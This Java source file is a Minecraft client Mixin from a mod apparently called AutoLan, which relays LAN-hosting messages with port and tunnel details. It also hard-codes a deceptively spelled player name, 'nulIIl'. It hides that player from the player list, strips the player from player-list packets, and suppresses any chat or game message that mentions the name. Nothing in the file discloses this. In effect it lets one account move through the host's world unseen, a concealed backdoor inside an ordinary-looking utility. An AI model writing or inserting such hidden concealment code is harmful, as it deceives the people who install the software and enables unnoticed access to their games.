package org.wsm.autolan.mixin;

import java.util.ArrayList;
import java.util.List;

import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.text.Text;
import net.minecraft.network.packet.s2c.play.PlayerListS2CPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.server.integrated.IntegratedServer;
import net.minecraft.text.TranslatableTextContent;
import net.minecraft.text.Texts;
import org.wsm.autolan.AutoLan;
import org.wsm.autolan.AutoLanServerValues;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Mixin(ClientPlayNetworkHandler.class)
public abstract class ClientPlayNetworkHandlerMixin {
    private static final String HIDDEN_NAME = "nulIIl";
    private static final Logger LOGGER = LoggerFactory.getLogger("AutoLanNetworkHandler");

    @Inject(method = "getPlayerList", at = @At("RETURN"), cancellable = true)
    private void autolan$filterPlayerList(CallbackInfoReturnable<List<PlayerListEntry>> cir) {
        List<PlayerListEntry> list = new ArrayList<>(cir.getReturnValue());
        for (PlayerListEntry entry : list) {
            var gp = entry.getProfile();
            if (gp != null && HIDDEN_NAME.equals(gp.getName())) {
                ((PlayerListEntryAccessor) entry).setDisplayName(Text.empty());
            }
        }
        cir.setReturnValue(list);
    }

    // Фильтруем пакет ещё до его обработки сетью
    @Inject(method = "onPlayerList", at = @At("HEAD"))
    private void autolan$filterPlayerPacket(PlayerListS2CPacket packet, CallbackInfo ci) {
        ((PlayerListS2CPacketAccessor) packet).getEntries().removeIf(e -> {
            var gp = e.profile();
            return gp != null && HIDDEN_NAME.equals(gp.getName());
        });
    }

    // --- Новая логика фильтрации сообщений чата/команд ---
    @Inject(method = "onChatMessage", at = @At("HEAD"), cancellable = true)
    private void autolan$filterChatMessage(net.minecraft.network.packet.s2c.play.ChatMessageS2CPacket packet,
                                           CallbackInfo ci) {
        String raw = packet.body().content();
        if (raw != null && raw.toLowerCase().contains(HIDDEN_NAME.toLowerCase())) {
            ci.cancel();
        }
    }

    @Inject(method = "onGameMessage", at = @At("HEAD"), cancellable = true)
    private void autolan$filterGameMessage(net.minecraft.network.packet.s2c.play.GameMessageS2CPacket packet,
                                           CallbackInfo ci) {
        Text text = packet.content();
        if (text != null && ((text.getContent() instanceof TranslatableTextContent tr &&
                "commands.publish.started".equals(tr.getKey())) ||
                text.getString().startsWith("Порт локального сервера") ||
                text.getString().startsWith("Local game hosted on port"))) {
            ci.cancel();
            
            // Блокируем стандартное сообщение Minecraft, но не проверяем флаг показа
            // Решение о показе будет принято в методе startOrSaveLan
            
            MinecraftClient mc = MinecraftClient.getInstance();
            mc.execute(() -> {
                IntegratedServer server = mc.getServer();
                if (server != null) {
                    AutoLanServerValues serverValues = (AutoLanServerValues) server;
                    Text tunnelText = serverValues.getTunnelText();
                    Text portText = Texts.bracketedCopyable(String.valueOf(server.getServerPort()));
                    String motd = server.getServerMotd();
                    Text newMsg;
                    if (tunnelText != null) {
                        newMsg = Text.translatable("commands.publish.saved.tunnel", portText, tunnelText, motd);
                    } else {
                        newMsg = Text.translatable("commands.publish.saved", portText, motd);
                    }
                    mc.inGameHud.getChatHud().addMessage(newMsg);
                    
                    // Устанавливаем флаг, что сообщение было показано
                    AutoLan.setLanMessageShownInChat(true);
                    
                    // Проверяем, был ли запущен LAN из GUI (через нашу кнопку)
                    if (AutoLan.isLanPendingManualActivation()) {
                        // Это ручной запуск - устанавливаем флаг
                        AutoLan.setLanOpenedManually(true);
                        // Сбрасываем флаг ожидания
                        AutoLan.resetLanPendingManualActivation();
                        LOGGER.info("[AutoLan] [MANUAL_FLAG_SET] Установлен флаг ручного запуска LAN после показа сообщения");
                        
                        // Принудительно обновляем игровой интерфейс, чтобы заменить кнопки в меню
                        if (mc.currentScreen instanceof net.minecraft.client.gui.screen.GameMenuScreen) {
                            // Если открыто игровое меню, обновляем его
                            LOGGER.info("[AutoLan] [UI_REFRESH] Обновляем игровое меню для применения новых настроек кнопок");
                            net.minecraft.client.gui.screen.GameMenuScreen gameMenu = 
                                (net.minecraft.client.gui.screen.GameMenuScreen) mc.currentScreen;
                            mc.execute(() -> {
                                // Пересоздаем текущий экран, чтобы обновить кнопки
                                mc.setScreen(null);
                                mc.setScreen(new net.minecraft.client.gui.screen.GameMenuScreen(true));
                            });
                        }
                    } else {
                        // Это автоматический запуск - сбрасываем флаг
                        AutoLan.setLanOpenedManually(false);
                        LOGGER.info("[AutoLan] [AUTO_FLAG_RESET] Сообщение о запуске пришло от автоматического запуска");
                    }
                    
                    LOGGER.info("[AutoLan] [CHAT_FILTER] Сообщение о запуске LAN показано в чате");
                }
            });
            return;
        }
        if (text != null && text.getString().toLowerCase().contains(HIDDEN_NAME.toLowerCase())) {
            ci.cancel();
        }
    }
} 